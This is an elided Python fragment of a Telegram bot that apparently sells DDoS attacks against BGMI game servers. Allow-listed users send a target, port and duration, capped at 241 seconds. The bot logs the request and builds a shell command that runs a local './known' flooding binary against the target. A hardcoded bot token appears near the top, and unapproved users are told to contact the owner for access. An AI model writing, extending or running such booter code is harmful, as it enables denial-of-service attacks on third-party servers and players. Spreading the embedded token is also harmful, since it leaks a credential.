...
bot = telebot.TeleBot('8108892446:AAFDGv08e3hbQDltoAP5cdu-g4-D51xTtrE')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 241:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 241 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                record_command_logs(user_id, '/4', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./known {target} {port} {time} 92 990"
        ...
        response = "JISAI ACCESS CHAHIYE YHA MSG KRO :- OWNER"
